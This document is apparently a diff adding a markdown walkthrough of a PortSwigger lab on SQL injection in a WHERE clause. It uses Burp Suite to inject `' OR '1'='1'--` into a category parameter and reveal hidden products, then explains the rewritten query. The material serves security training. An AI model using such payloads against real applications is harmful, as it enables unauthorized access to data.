@@ -1,0 +1,182 @@
+# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
+
+## 🎯 Objective
+
+The application hides some products using a SQL `WHERE` condition.
+
+**Goal:** Modify the request so that the application displays the hidden products.
+
+---
+
+## 🛠️ Tool
+
+* Burp Suite
+* Browser
+* PortSwigger Web Security Academy
+
+---
+
+## Step 1 — Open the Lab
+
+Open the lab and go to the **product/category page**.
+
+For example, select a category such as:
+
+```text
+Gifts
+```
+
+The URL/request will contain a category parameter similar to:
+
+```text
+/category?category=Gifts
+```
+
+---
+
+## Step 2 — Intercept the Request
+
+1. Open **Burp Suite**.
+2. Go to **Proxy → Intercept**.
+3. Turn **Intercept ON**.
+4. Refresh/select the category in the browser.
+5. Burp captures the request.
+
+You should see something similar to:
+
+```http
+GET /filter?category=Gifts HTTP/1.1
+Host: <lab-host>
+```
+
+---
+
+## Step 3 — Send to Repeater
+
+Right-click the request and select:
+
+**Send to Repeater**
+
+Then go to:
+
+**Repeater → Request**
+
+---
+
+## Step 4 — Understand the Vulnerability
+
+The application may internally execute a query similar to:
+
+```sql
+SELECT * FROM products
+WHERE category = 'Gifts'
+AND released = 1
+```
+
+The:
+
+```sql
+AND released = 1
+```
+
+condition causes unreleased/hidden products to remain hidden.
+
+Our goal is to make the SQL condition always true.
+
+---
+
+## Step 5 — Test SQL Injection
+
+Change:
+
+```http
+category=Gifts
+```
+
+to:
+
+```http
+category=Gifts' OR '1'='1'--
+```
+
+So the request becomes:
+
+```http
+GET /filter?category=Gifts' OR '1'='1'-- HTTP/1.1
+```
+
+Click **Send**.
+
+---
+
+## Step 6 — Understand What Happened
+
+The application's SQL query can effectively become:
+
+```sql
+SELECT * FROM products
+WHERE category = 'Gifts'
+OR '1'='1'
+-- ' AND released = 1
+```
+
+Here:
+
+```sql
+'1'='1'
+```
+
+is always **TRUE**.
+
+And:
+
+```sql
+--
+```
+
+comments out the remaining part of the SQL query.
+
+Therefore, the condition restricting hidden products is bypassed.
+
+---
+
+## Step 7 — Check the Response
+
+Look at the response in Burp Repeater.
+
+You should now see **additional products that were previously hidden**.
+
+This means the SQL injection was successful.
+
+---
+
+## ✅ Result
+
+The hidden products were successfully retrieved by exploiting the SQL injection vulnerability in the `WHERE` clause.
+
+---
+
+## 🧠 Key Learning
+
+* User input was directly included in an SQL query.
+* The input was not safely handled.
+* `' OR '1'='1'--` changed the SQL logic.
+* `OR` created an always-true condition.
+* `--` commented out the remaining SQL query.
+* Burp Suite Repeater can be used to test and modify requests.
+
+### Attack Flow
+
+```text
+Browser
+   ↓
+Intercept with Burp
+   ↓
+Find vulnerable parameter
+   ↓
+Modify category parameter
+   ↓
+Send SQL injection payload
+   ↓
+Hidden data appears
+```
